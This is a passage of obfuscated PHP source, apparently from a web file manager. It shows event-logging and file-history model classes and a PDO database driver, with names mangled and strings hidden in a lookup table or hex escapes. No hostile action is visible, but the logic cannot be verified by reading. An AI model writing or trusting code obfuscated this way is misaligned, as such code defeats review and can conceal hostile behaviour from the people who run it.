$ô±€Éìà = $­³¤¦Â¯->sourceInfo($èÜÆ¡Ô«); $Ã×úËÆĞ = $­³¤¦Â¯->sourceInfo($ØûÃ‰); $öø¤´ßÛ = array($­¶­Û®º[1208] => $èÜÆ¡Ô«, $­¶­Û®º[2130] => $ô±€Éìà[$­¶­Û®º[32]], $­¶­Û®º[2107] => !empty($ô±€Éìà[$­¶­Û®º[554]]) ? $ô±€Éìà[$­¶­Û®º[554]] : $­¶­Û®º[12], $­¶­Û®º[1209] => $ØûÃ‰, $­¶­Û®º[2131] => $Ã×úËÆĞ[$­¶­Û®º[32]], $­¶­Û®º[2132] => !empty($Ã×úËÆĞ[$­¶­Û®º[554]]) ? $Ã×úËÆĞ[$­¶­Û®º[554]] : $­¶­Û®º[12]); $this->addEvent($®íçã¶‹, $­¶­Û®º[591], $öø¤´ßÛ); $ßëöåÙÂ = $­³¤¦Â¯->sourceInfo($®íçã¶‹); $öø¤´ßÛ = array($­¶­Û®º[183] => $ßëöåÙÂ[$­¶­Û®º[183]], $­¶­Û®º[32] => $ßëöåÙÂ[$­¶­Û®º[32]]); $this->addEvent($èÜÆ¡Ô«, $­¶­Û®º[2133], $öø¤´ßÛ); } public function eventCopy($«§©¨Æã) { $this->eventCreate($«§©¨Æã, $_SERVER[èùÙ¹Ïö][589]); } public function eventRename($Ç±œôÏÆ, $›Èõ›ß°, $¤”óßäÛ) { $Ò©ŒÀŠ» =& $_SERVER[èùÙ¹Ïö]; $‡â¨‰Ñ´ = array($Ò©ŒÀŠ»[1208] => $›Èõ›ß°, $Ò©ŒÀŠ»[1209] => $¤”óßäÛ); return $this->addEvent($Ç±œôÏÆ, $Ò©ŒÀŠ»[1395], $‡â¨‰Ñ´); } public function eventAddComment($İĞ ‡, $³ÏÏÎ™‘) { return $this->addEvent($İĞ ‡, $_SERVER[èùÙ¹Ïö][2134], $³ÏÏÎ™‘); } public function eventAddDesc($¸Ğã»£Ï, $Åó«‰ë) { return $this->addEvent($¸Ğã»£Ï, $_SERVER[èùÙ¹Ïö][2135], $Åó«‰ë); } public function listBySource($”¸¯Ø²²) { $š‹Ïæ÷ú =& $_SERVER[èùÙ¹Ïö]; $œúà = Model($š‹Ïæ÷ú[1381])->sourceInfo($”¸¯Ø²²); $ïş›¿Ü‡ = array($š‹Ïæ÷ú[461] => $”¸¯Ø²²); if ($œúà[$š‹Ïæ÷ú[455]] == $š‹Ïæ÷ú[90]) { $Šá´¤¾ = Model($š‹Ïæ÷ú[1381])->listSearchChildren($”¸¯Ø²², 20000); $Šá´¤¾[] = $”¸¯Ø²² . $š‹Ïæ÷ú[424]; $ïş›¿Ü‡ = array($š‹Ïæ÷ú[183] => array($š‹Ïæ÷ú[7], $Šá´¤¾)); } $Î«Ë‡¤ = $this->where($ïş›¿Ü‡)->order($š‹Ïæ÷ú[2136])->selectPage(); if ($Î«Ë‡¤[$š‹Ïæ÷ú[412]][$š‹Ïæ÷ú[413]] == 0) { $Î«Ë‡¤[$š‹Ïæ÷ú[412]][$š‹Ïæ÷ú[413]] = 1; $Î«Ë‡¤[$š‹Ïæ÷ú[415]] = array(array($š‹Ïæ÷ú[461] => $”¸¯Ø²², $š‹Ïæ÷ú[2117] => $œúà[$š‹Ïæ÷ú[182]], $š‹Ïæ÷ú[1687] => $œúà[$š‹Ïæ÷ú[497]], $š‹Ïæ÷ú[466] => $š‹Ïæ÷ú[2137], $š‹Ïæ÷ú[467] => $œúà[$š‹Ïæ÷ú[217]], $š‹Ïæ÷ú[1689] => $š‹Ïæ÷ú[12])); } return $this->eventListParse($Î«Ë‡¤, $”¸¯Ø²²); } private function eventListParse($ó–š…Ôå, $ßŞƒ«ºî) { $°§ÌâÂ¢ =& $_SERVER[èùÙ¹Ïö]; $³ª¶‘ùË = $ó–š…Ôå[$°§ÌâÂ¢[415]]; $šØûº = array_to_keyvalue($³ª¶‘ùË, $°§ÌâÂ¢[12], $°§ÌâÂ¢[183]); $üàæÑà = array_to_keyvalue($³ª¶‘ùË, $°§ÌâÂ¢[12], $°§ÌâÂ¢[2123]); foreach ($³ª¶‘ùË as $«È•æšê) { $Ìø ”˜º = $«È•æšê[$°§ÌâÂ¢[496]]; if ($«È•æšê[$°§ÌâÂ¢[33]] == $°§ÌâÂ¢[591] && isset($Ìø ”˜º[$°§ÌâÂ¢[1208]])) { $šØûº[] = $Ìø ”˜º[$°§ÌâÂ¢[1208]] . $°§ÌâÂ¢[12]; $šØûº[] = $Ìø ”˜º[$°§ÌâÂ¢[1209]] . $°§ÌâÂ¢[12]; } if ($«È•æšê[$°§ÌâÂ¢[33]] == $°§ÌâÂ¢[2133] && isset($Ìø ”˜º[$°§ÌâÂ¢[183]])) { $šØûº[] = $Ìø ”˜º[$°§ÌâÂ¢[183]] . $°§ÌâÂ¢[12]; } } $šØûº = array_merge($šØûº, $üàæÑà, array($ßŞƒ«ºî . $°§ÌâÂ¢[12])); $šØûº = array_unique($šØûº); $Ù³´úä = array_unique(array_to_keyvalue($³ª¶‘ùË, $°§ÌâÂ¢[12], $°§ÌâÂ¢[1696])); $ÇÄ¸“øé = Model($°§ÌâÂ¢[570])->userListInfo($Ù³´úä); $á³Œö³ñ = Model($°§ÌâÂ¢[865])->sourceListInfo($šØûº, !0); foreach ($³ª¶‘ùË as &$«È•æšê) { if ($«È•æšê[$°§ÌâÂ¢[33]] == $°§ÌâÂ¢[591] && isset($«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[1208]])) { $«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[1208]] = $á³Œö³ñ[$«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[1208]]]; $«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[1209]] = $á³Œö³ñ[$«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[1209]]]; } if ($«È•æšê[$°§ÌâÂ¢[33]] == $°§ÌâÂ¢[2133] && isset($«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[183]])) { $«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[183]] = $á³Œö³ñ[$«È•æšê[$°§ÌâÂ¢[496]][$°§ÌâÂ¢[183]]]; } $«È•æšê[$°§ÌâÂ¢[89]] = $á³Œö³ñ[$«È•æšê[$°§ÌâÂ¢[183]]]; $«È•æšê[$°§ÌâÂ¢[2138]] = $á³Œö³ñ[$«È•æšê[$°§ÌâÂ¢[2123]]]; if ($«È•æšê[$°§ÌâÂ¢[33]] == $°§ÌâÂ¢[1863]) { $«È•æšê[$°§ÌâÂ¢[2138]] = $«È•æšê[$°§ÌâÂ¢[89]]; $«È•æšê[$°§ÌâÂ¢[2123]] = $«È•æšê[$°§ÌâÂ¢[2138]][$°§ÌâÂ¢[183]]; $«È•æšê[$°§ÌâÂ¢[89]] = !1; $«È•æšê[$°§ÌâÂ¢[183]] = $°§ÌâÂ¢[12]; } $«È•æšê[$°§ÌâÂ¢[2067]] = $ÇÄ¸“øé[$«È•æšê[$°§ÌâÂ¢[1696]]]; } unset($«È•æšê); $ó–š…Ôå[$°§ÌâÂ¢[415]] = $³ª¶‘ùË; return $ó–š…Ôå; } public function removeBySource($Å…¿ï’ö) { $ÄŞ»‚¥ = array($_SERVER[èùÙ¹Ïö][461] => $Å…¿ï’ö); $this->where($ÄŞ»‚¥)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\150\x69\x73\164\157\x72\x79"; public function historyCount($©­Õ›) { $àŒóËŒ =& $_SERVER[èùÙ¹Ïö]; if (!$©­Õ›) { return array(); } if (is_string($©­Õ›) || is_int($©­Õ›)) { $©­Õ› = array($©­Õ›); } $İÏ•ÃŸÓ = array($àŒóËŒ[183], $àŒóËŒ[1927] => $àŒóËŒ[536]); $ß‘ğ³Ä‡ = array($àŒóËŒ[183] => array($àŒóËŒ[7], $©­Õ›)); $ıäÉÙ› = $this->field($İÏ•ÃŸÓ)->where($ß‘ğ³Ä‡)->group($àŒóËŒ[183])->select(); return array_to_keyvalue($ıäÉÙ›, $àŒóËŒ[183], $àŒóËŒ[536]); } public function addHistory($ÌÎğŞâ, $ˆğÛ­¿Û = '') { $µ†í¹ĞÔ =& $_SERVER[èùÙ¹Ïö]; $Ş‹ÜÈ²à = array($µ†í¹ĞÔ[461] => $ÌÎğŞâ[$µ†í¹ĞÔ[183]], $µ†í¹ĞÔ[1687] => isset($ÌÎğŞâ[$µ†í¹ĞÔ[499]]) ? $ÌÎğŞâ[$µ†í¹ĞÔ[499]] : $ÌÎğŞâ[$µ†í¹ĞÔ[497]], $µ†í¹ĞÔ[512] => $ÌÎğŞâ[$µ†í¹ĞÔ[511]], $µ†í¹ĞÔ[588] => $ÌÎğŞâ[$µ†í¹ĞÔ[78]], $µ†í¹ĞÔ[2139] => $ˆğÛ­¿Û); if ($GLOBALS[$µ†í¹ĞÔ[6]][$µ†í¹ĞÔ[91]][$µ†í¹ĞÔ[1265]] >= 1) { $this->historyAutoClear($Ş‹ÜÈ²à[$µ†í¹ĞÔ[183]]); $this->add($Ş‹ÜÈ²à); } Hook::trigger($µ†í¹ĞÔ[2140], $Ş‹ÜÈ²à); Model($µ†í¹ĞÔ[2141])->eventFileEdit($ÌÎğŞâ[$µ†í¹ĞÔ[183]]); } private function historyAutoClear($ü÷¶Æ˜) { $ó†¤…ì† =& $_SERVER[èùÙ¹Ïö]; $Êï¬ÔÀ = Model($ó†¤…ì†[810])->get($ó†¤…ì†[1287]); $İ®†ƒÎ = intval($GLOBALS[$ó†¤…ì†[6]][$ó†¤…ì†[91]][$ó†¤…ì†[1265]]); $¨ª‚ì•Ğ = $Êï¬ÔÀ == $ó†¤…ì†[1288] ? min(5, $İ®†ƒÎ) : $İ®†ƒÎ; $¨ª‚ì•Ğ = $¨ª‚ì•Ğ <= 0 ? 0 : $¨ª‚ì•Ğ - 1; if ($¨ª‚ì•Ğ >= 500) { return; } $û€¥°à‹ = array($ó†¤…ì†[461] => $ü÷¶Æ˜); $ùâãıœÓ = $this->field($ó†¤…ì†[2142])->where($û€¥°à‹)->order($ó†¤…ì†[2136])->select(); if (!$ùâãıœÓ || $¨ª‚ì•Ğ >= count($ùâãıœÓ)) { return; } $ñ²Ú·Ù = array_to_keyvalue($ùâãıœÓ, $ó†¤…ì†[12], $ó†¤…ì†[445]); $ñ²Ú·Ù = array_slice($ñ²Ú·Ù, $¨ª‚ì•Ğ); $’âÉ¬ò = array_to_keyvalue($ùâãıœÓ, $ó†¤…ì†[12], $ó†¤…ì†[511]); $’âÉ¬ò = array_slice($’âÉ¬ò, $¨ª‚ì•Ğ); if (!$ñ²Ú·Ù || !$’âÉ¬ò) { return; } $û€¥°à‹ = array($ó†¤…ì†[463] => array($ó†¤…ì†[7], $ñ²Ú·Ù)); $this->where($û€¥°à‹)->delete(); Model($ó†¤…ì†[514])->remove($’âÉ¬ò); } public function listData($ Öœàıù) { $»Ñó½ù =& $_SERVER[èùÙ¹Ïö]; $“Ù§ûÄ = array($»Ñó½ù[461] => $ Öœàıù); $ñ©’Š×» = $»Ñó½ù[2143]; $¥“»‚ßç = $this->field($ñ©’Š×»)->where($“Ù§ûÄ)->order($»Ñó½ù[2136])->selectPage(); $this->_listAppendUser($¥“»‚ßç[$»Ñó½ù[415]]); $³®ß˜º¸ = Model($»Ñó½ù[810])->get($»Ñó½ù[1287]); $Â”ş’Ú‡ = 5; if ($³®ß˜º¸ == $»Ñó½ù[1288]) { $¥“»‚ßç[$»Ñó½ù[415]] = array_slice($¥“»‚ßç[$»Ñó½ù[415]], 0, $Â”ş’Ú‡); $¥“»‚ßç[$»Ñó½ù[412]] = array($»Ñó½ù[2144] => 1, $»Ñó½ù[2145] => 20, $»Ñó½ù[2146] => 1, $»Ñó½ù[2147] => count($¥“»‚ßç[$»Ñó½ù[415]])); } return $¥“»‚ßç; } protected function _listAppendUser(&$êÂëã¡‚) { $½×Ç—ª’ =& $_SERVER[èùÙ¹Ïö]; $çµ·ÃßÆ = array_to_keyvalue($êÂëã¡‚, $½×Ç—ª’[12], $½×Ç—ª’[1696]); $†Ê‹ÅÌ = Model($½×Ç—ª’[570])->userListInfo($çµ·ÃßÆ); foreach ($êÂëã¡‚ as &$­ˆ£¹×Ô) { $‡ñÒ¨ïĞ = $­ˆ£¹×Ô[$½×Ç—ª’[1696]]; $­ˆ£¹×Ô[$½×Ç—ª’[497]] = $†Ê‹ÅÌ[$‡ñÒ¨ïĞ] ? $†Ê‹ÅÌ[$‡ñÒ¨ïĞ] : !1; } unset($­ˆ£¹×Ô); } public function fileInfo($²Ä¬ŞÎô) { $½à”õ¹İ =& $_SERVER[èùÙ¹Ïö]; $ğÉ±°í = $this->tablePrefix; $…ƒ‹¼¨Ù = "{$ğÉ±°í}\151\x6f\137\x66\x69\154\145\40\x66\x69\154\145\x73\x20\157\156\x20\x66\151\154\x65\163\x2e\146\151\x6c\x65\111\104\x20\x3d\40\x68\x69\163\164\x6f\x72\x79\x2e\x66\151\154\x65\111\104"; return $this->alias($½à”õ¹İ[2148])->where(array($½à”õ¹İ[463] => $²Ä¬ŞÎô))->join($…ƒ‹¼¨Ù, $½à”õ¹İ[2149])->find(); } public function removeItem($ŠÉ§¢­Û) { $Æî“Ü˜ =& $_SERVER[èùÙ¹Ïö]; $¥‰‹”İé = array($Æî“Ü˜[463] => $ŠÉ§¢­Û); $ˆ’şËÚş = $this->where($¥‰‹”İé)->find(); if ($ˆ’şËÚş) { $­¨°”å´ = $this->where($¥‰‹”İé)->delete(); Model($Æî“Ü˜[514])->remove($ˆ’şËÚş[$Æî“Ü˜[511]]); return $­¨°”å´; } return !1; } public function removeBySource($§ÄİÏÉ) { $İ“÷ãõ =& $_SERVER[èùÙ¹Ïö]; if (!$§ÄİÏÉ) { return !1; } if (!is_array($§ÄİÏÉ)) { $§ÄİÏÉ = array($§ÄİÏÉ); } $¬ô³ïøé = array($İ“÷ãõ[461] => array($İ“÷ãõ[7], $§ÄİÏÉ)); $à‰İœĞ˜ = $this->field($İ“÷ãõ[512])->where($¬ô³ïøé)->select(); if ($à‰İœĞ˜) { $this->where($¬ô³ïøé)->delete(); $Ÿ¬—İ = array_to_keyvalue($à‰İœĞ˜, $İ“÷ãõ[12], $İ“÷ãõ[511]); Model($İ“÷ãõ[514])->remove($Ÿ¬—İ); } return !0; } public function setDetail($ŸíşÉÌü, $·î¼»¨ª) { $Öš‰”‚Ã =& $_SERVER[èùÙ¹Ïö]; return $this->where(array($Öš‰”‚Ã[463] => $ŸíşÉÌü))->save(array($Öš‰”‚Ã[2139] => $·î¼»¨ª)); } public function rollbackToItem($šÜêß”Ó, $û…º™ê­) { $ö¥ê« á =& $_SERVER[èùÙ¹Ïö]; $ÌÍÄŒ‚Ô = Model($ö¥ê« á[865])->sourceInfo($šÜêß”Ó); $this->addHistory($ÌÍÄŒ‚Ô, LNG($ö¥ê« á[2150])); $»ÃÁà¼ = $this->find($û…º™ê­); $Å÷îÂ¹µ = array($ö¥ê« á[511] => $»ÃÁà¼[$ö¥ê« á[511]], $ö¥ê« á[78] => $»ÃÁà¼[$ö¥ê« á[78]], $ö¥ê« á[87] => time(), $ö¥ê« á[499] => USER_ID); Model($ö¥ê« á[865])->where(array($ö¥ê« á[183] => $šÜêß”Ó))->save($Å÷îÂ¹µ); return $this->where(array($ö¥ê« á[463] => $û…º™ê­))->delete(); } public function clearSame($Á†ğÉüá) { $ÅâŒ¨Ëº =& $_SERVER[èùÙ¹Ïö]; $³ÅÂÇÏŸ = $this->listData($Á†ğÉüá); $ìÆá¬Ÿ = array_to_keyvalue_group($³ÅÂÇÏŸ, $ÅâŒ¨Ëº[511]); $Ùâê‘Àı = array(); $‰û›õ¼Ô = array(); foreach ($ìÆá¬Ÿ as $üÀ…¦¦œ) { if (!$üÀ…¦¦œ || count($üÀ…¦¦œ) <= 1) { continue; } foreach ($üÀ…¦¦œ as $ªğÌƒüë) { $Ùâê‘Àı[] = $ªğÌƒüë[$ÅâŒ¨Ëº[511]]; $‰û›õ¼Ô[] = $ªğÌƒüë[$ÅâŒ¨Ëº[445]]; } } if (!$‰û›õ¼Ô) { return; } $this->where(array($ÅâŒ¨Ëº[445] => array($ÅâŒ¨Ëº[7], $‰û›õ¼Ô)))->delete(); Model($ÅâŒ¨Ëº[514])->remove($Ùâê‘Àı); } public function userSpace() { $ØÑó¬ÜÄ =& $_SERVER[èùÙ¹Ïö]; $™Á¢Øäõ = $this->tablePrefix; $œ‹ˆ Ñ = array($ØÑó¬ÜÄ[1687] => USER_ID); $ÙæÛÎø× = "{$™Á¢Øäõ}\151\157\137\x66\x69\x6c\x65\x20\146\x69\154\145\163\40\x6f\156\x20\x66\x69\x6c\145\x73\x2e\146\151\x6c\145\x49\x44\40\x3d\x20\150\x69\x73\164\157\162\x79\56\146\x69\154\x65\x49\x44"; return $this->alias($ØÑó¬ÜÄ[2148])->where($œ‹ˆ Ñ)->join($ÙæÛÎø×, $ØÑó¬ÜÄ[2149])->sum($ØÑó¬ÜÄ[78]); } } goto d‹Åæã­§; c¨Éä•Æ™–: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($è“Øî°Å = '') { $Ÿ¦™ãšÆ =& $_SERVER[èùÙ¹Ïö]; if (!class_exists($Ÿ¦™ãšÆ[960])) { think_exception(think_lang($Ÿ¦™ãšÆ[14]) . $Ÿ¦™ãšÆ[961]); } if (!empty($è“Øî°Å)) { $this->config = $è“Øî°Å; if (empty($this->config[$Ÿ¦™ãšÆ[17]])) { $this->config[$Ÿ¦™ãšÆ[17]] = array(); } } } public function connect($Ù“êÆ ç = '', $ÅòïÚò• = 0) { $¸˜¢Õ¶Ç =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->linkID[$ÅòïÚò•])) { if (empty($Ù“êÆ ç)) { $Ù“êÆ ç = $this->config; } $ßô¯Õ—„ = !empty($Ù“êÆ ç[$¸˜¢Õ¶Ç[17]][$¸˜¢Õ¶Ç[18]]) ? $Ù“êÆ ç[$¸˜¢Õ¶Ç[17]][$¸˜¢Õ¶Ç[18]] : $this->pconnect; if ($ßô¯Õ—„) { $Ù“êÆ ç[$¸˜¢Õ¶Ç[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÅòïÚò•] = new PDO($Ù“êÆ ç[$¸˜¢Õ¶Ç[962]], $Ù“êÆ ç[$¸˜¢Õ¶Ç[934]], $Ù“êÆ ç[$¸˜¢Õ¶Ç[935]], $Ù“êÆ ç[$¸˜¢Õ¶Ç[17]]); } catch (PDOException $Â¶¬°ë) { think_exception($Â¶¬°ë->getMessage()); } $this->dbType = $this->_getDsnType($Ù“êÆ ç[$¸˜¢Õ¶Ç[962]]); if (in_array($this->dbType, array($¸˜¢Õ¶Ç[963], $¸˜¢Õ¶Ç[964], $¸˜¢Õ¶Ç[965], $¸˜¢Õ¶Ç[966]))) { think_exception($¸˜¢Õ¶Ç[967] . $this->dbType . $¸˜¢Õ¶Ç[968] . $this->dbType . $¸˜¢Õ¶Ç[969]); } if (!$this->linkID[$ÅòïÚò•]) { think_exception($¸˜¢Õ¶Ç[970]); } try { $this->linkID[$ÅòïÚò•]->exec($¸˜¢Õ¶Ç[971] . think_config($¸˜¢Õ¶Ç[937])); } catch (Exception $Â¶¬°ë) { } $this->connected = !0; if (1 != think_config($¸˜¢Õ¶Ç[22])) { unset($this->config); } } return $this->linkID[$ÅòïÚò•]; } public function free() { $this->PDOStatement = null; } public function query($ò”ö£ºñ, $•ĞµŞïæ = array()) { $ÉÌÛôÜü =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ò”ö£ºñ; if (!empty($•ĞµŞïæ)) { $this->queryStr .= $ÉÌÛôÜü[972] . print_r($•ĞµŞïæ, !0) . $ÉÌÛôÜü[973]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÉÌÛôÜü[23], 1); think_status($ÉÌÛôÜü[24]); $this->PDOStatement = $this->_linkID->prepare($ò”ö£ºñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $œê¬Ğã = $this->PDOStatement->execute($•ĞµŞïæ); $this->debug(); if (!1 === $œê¬Ğã) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ã„¼°­Ñ, $—€áŞüà = array()) { $â÷Ô•Û =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ã„¼°­Ñ; if (!empty($—€áŞüà)) { $this->queryStr .= $â÷Ô•Û[972] . print_r($—€áŞüà, !0) . $â÷Ô•Û[973]; } $ù·ßá½ = !1; if ($this->dbType == $â÷Ô•Û[966]) { if (preg_match($â÷Ô•Û[974], $this->queryStr, $±ÊÃ¨¸ä)) { $this->table = think_config($â÷Ô•Û[975]) . str_ireplace(think_config($â÷Ô•Û[976]), $â÷Ô•Û[424], $±ÊÃ¨¸ä[2]); $ù·ßá½ = (bool) $this->query($â÷Ô•Û[977] . strtoupper($this->table) . $â÷Ô•Û[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($â÷Ô•Û[25], 1); think_status($â÷Ô•Û[24]); $this->PDOStatement = $this->_linkID->prepare($ã„¼°­Ñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ùûƒµ = $this->PDOStatement->execute($—€áŞüà); $this->debug(); if (!1 === $Ùûƒµ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ù·ßá½ || preg_match($â÷Ô•Û[978], $ã„¼°­Ñ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $òÆ–Œ’¾ = $this->_linkID->commit(); $this->transTimes = 0; if (!$òÆ–Œ’¾) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚÑ‹‘Ü = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÚÑ‹‘Ü) { $this->error(); return !1; } } return !0; } private function getAll() { $¡Ê®Ãòî = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¡Ê®Ãòî); return $¡Ê®Ãòî; } public function getFields($¾×·Áæ™) { $‰‡¾–Ş =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (think_config($‰‡¾–Ş[979])) { $’’ğ¥¥› = str_replace($‰‡¾–Ş[980], $¾×·Áæ™, think_config($‰‡¾–Ş[979])); } else { switch ($this->dbType) { case $‰‡¾–Ş[963]: case $‰‡¾–Ş[981]: $’’ğ¥¥› = "\x53\x45\114\x45\103\124\40\40\40\143\157\x6c\165\x6d\156\x5f\x6e\x61\155\x65\40\x61\x73\40\x27\x4e\141\x6d\x65\47\x2c\40\x20\x20\144\x61\x74\141\x5f\164\x79\160\x65\x20\x61\163\x20\47\x54\x79\160\145\x27\x2c\40\x20\40\x63\x6f\154\x75\x6d\x6e\x5f\144\x65\x66\x61\165\x6c\x74\40\x61\x73\40\47\x44\x65\x66\141\x75\x6c\164\x27\54\40\x20\x20\x69\163\x5f\x6e\x75\x6c\154\x61\x62\154\x65\40\141\163\x20\47\116\165\x6c\x6c\47\12\11\11\x46\x52\x4f\115\x9\x69\x6e\x66\157\x72\155\141\164\151\157\x6e\137\x73\143\x68\145\x6d\x61\x2e\164\141\142\x6c\x65\x73\x20\101\123\40\164\12\11\x9\112\117\111\x4e\x9\151\x6e\x66\x6f\x72\x6d\x61\x74\x69\157\x6e\137\163\143\150\x65\x6d\x61\56\143\x6f\154\x75\155\x6e\163\40\101\123\x20\143\xa\x9\11\117\116\40\40\164\x2e\x74\x61\142\154\x65\137\143\x61\x74\141\x6c\x6f\147\x20\x3d\40\x63\56\x74\x61\x62\154\x65\x5f\143\x61\x74\141\x6c\157\x67\12\11\11\101\116\x44\x20\164\x2e\x74\x61\142\x6c\145\137\x73\x63\150\x65\x6d\141\40\x3d\x20\143\x2e\164\141\142\154\x65\137\x73\x63\x68\145\x6d\141\xa\11\11\101\116\x44\40\164\x2e\x74\141\142\x6c\145\x5f\156\141\x6d\x65\x20\x3d\x20\x63\56\x74\141\142\154\x65\x5f\x6e\x61\x6d\x65\xa\x9\11\x57\x48\105\x52\105\40\x20\x20\x74\x2e\x74\141\142\154\x65\x5f\156\x61\155\x65\x20\75\x20\47{$¾×·Áæ™}\47"; break; case $‰‡¾–Ş[982]: $’’ğ¥¥› = $‰‡¾–Ş[983] . $¾×·Áæ™ . $‰‡¾–Ş[984]; break; case $‰‡¾–Ş[964]: case $‰‡¾–Ş[966]: $’’ğ¥¥› = $‰‡¾–Ş[985] . $‰‡¾–Ş[986] . $‰‡¾–Ş[987] . strtoupper($¾×·Áæ™) . $‰‡¾–Ş[988] . strtoupper($¾×·Áæ™) . $‰‡¾–Ş[989]; break; case $‰‡¾–Ş[990]: $’’ğ¥¥› = $‰‡¾–Ş[991] . $¾×·Áæ™ . $‰‡¾–Ş[992]; break; case $‰‡¾–Ş[965]: break; case $‰‡¾–Ş[993]: default: $’’ğ¥¥› = $‰‡¾–Ş[994] . ($this->dbType == $‰‡¾–Ş[993] ? "\x60{$¾×·Áæ™}\140" : $¾×·Áæ™); } } $˜„¬á  = $this->query($’’ğ¥¥›); $…àà£Å· = array(); if ($˜„¬á ) { foreach ($˜„¬á  as $’ÏîüìÂ => $Éç®üä…) { $Éç®üä… = array_change_key_case($Éç®üä…); $Éç®üä…[$‰‡¾–Ş[32]] = isset($Éç®üä…[$‰‡¾–Ş[32]]) ? $Éç®üä…[$‰‡¾–Ş[32]] : $‰‡¾–Ş[424]; $Éç®üä…[$‰‡¾–Ş[33]] = isset($Éç®üä…[$‰‡¾–Ş[33]]) ? $Éç®üä…[$‰‡¾–Ş[33]] : $‰‡¾–Ş[424]; $ŠÁâÃÛ§ = isset($Éç®üä…[$‰‡¾–Ş[319]]) ? $Éç®üä…[$‰‡¾–Ş[319]] : $Éç®üä…[$‰‡¾–Ş[32]]; $…àà£Å·[$ŠÁâÃÛ§] = array($‰‡¾–Ş[32] => $ŠÁâÃÛ§, $‰‡¾–Ş[33] => $Éç®üä…[$‰‡¾–Ş[33]], $‰‡¾–Ş[35] => (bool) (isset($Éç®üä…[$‰‡¾–Ş[105]]) && $Éç®üä…[$‰‡¾–Ş[105]] === $‰‡¾–Ş[12] || isset($Éç®üä…[$‰‡¾–Ş[35]]) && $Éç®üä…[$‰‡¾–Ş[35]] === $‰‡¾–Ş[12]), $‰‡¾–Ş[37] => isset($Éç®üä…[$‰‡¾–Ş[37]]) ? $Éç®üä…[$‰‡¾–Ş[37]] : (isset($Éç®üä…[$‰‡¾–Ş[56]]) ? $Éç®üä…[$‰‡¾–Ş[56]] : $‰‡¾–Ş[424]), $‰‡¾–Ş[39] => isset($Éç®üä…[$‰‡¾–Ş[96]]) ? strtolower($Éç®üä…[$‰‡¾–Ş[96]]) == $‰‡¾–Ş[41] : (isset($Éç®üä…[$‰‡¾–Ş[57]]) ? $Éç®üä…[$‰‡¾–Ş[57]] : !1), $‰‡¾–Ş[42] => isset($Éç®üä…[$‰‡¾–Ş[995]]) ? strtolower($Éç®üä…[$‰‡¾–Ş[995]]) == $‰‡¾–Ş[44] : (isset($Éç®üä…[$‰‡¾–Ş[96]]) ? $Éç®üä…[$‰‡¾–Ş[96]] : !1)); } } return $…àà£Å·; } public function getTables($‡ˆñ¼Ø = '') { $¾ç÷à­ =& $_SERVER[èùÙ¹Ïö]; if (think_config($¾ç÷à­[996])) { $¹üşù‰® = str_replace($¾ç÷à­[997], $‡ˆñ¼Ø, think_config($¾ç÷à­[996])); } else { switch ($this->dbType) { case $¾ç÷à­[964]: case $¾ç÷à­[966]: $¹üşù‰® = $¾ç÷à­[998]; break; case $¾ç÷à­[963]: case $¾ç÷à­[981]: $¹üşù‰® = $¾ç÷à­[999]; break; case $¾ç÷à­[990]: $¹üşù‰® = $¾ç÷à­[1000]; break; case $¾ç÷à­[965]: think_exception(think_lang($¾ç÷à­[1001]) . $¾ç÷à­[1002]); break; case $¾ç÷à­[982]: $¹üşù‰® = $¾ç÷à­[45] . $¾ç÷à­[46] . $¾ç÷à­[47]; break; case $¾ç÷à­[993]: default: if (!empty($‡ˆñ¼Ø)) { $¹üşù‰® = $¾ç÷à­[945] . $‡ˆñ¼Ø . $¾ç÷à­[946]; } else { $¹üşù‰® = $¾ç÷à­[947]; } } } $½ÒÌÛ´ó = $this->query($¹üşù‰®); $²„¿»÷ = array(); foreach ($½ÒÌÛ´ó as $ŠÊ¯Ë«„ => $–Î–¢) { $²„¿»÷[$ŠÊ¯Ë«„] = current($–Î–¢); } return $²„¿»÷; } protected function parseLimit($İ“åÔ£ö) { $ö†—„œœ =& $_SERVER[èùÙ¹Ïö]; $™İÒŞŸé = $ö†—„œœ[12]; if (!empty($İ“åÔ£ö)) { switch ($this->dbType) { case $ö†—„œœ[990]: case $ö†—„œœ[982]: $İ“åÔ£ö = explode($ö†—„œœ[50], $İ“åÔ£ö); if (count($İ“åÔ£ö) > 1) { $™İÒŞŸé .= $ö†—„œœ[51] . $İ“åÔ£ö[1] . $ö†—„œœ[52] . $İ“åÔ£ö[0] . $ö†—„œœ[53]; } else { $™İÒŞŸé .= $ö†—„œœ[51] . $İ“åÔ£ö[0] . $ö†—„œœ[53]; } break; case $ö†—„œœ[963]: case $ö†—„œœ[981]: break; case $ö†—„œœ[965]: break; case $ö†—„œœ[964]: case $ö†—„œœ[966]: break; case $ö†—„œœ[993]: default: 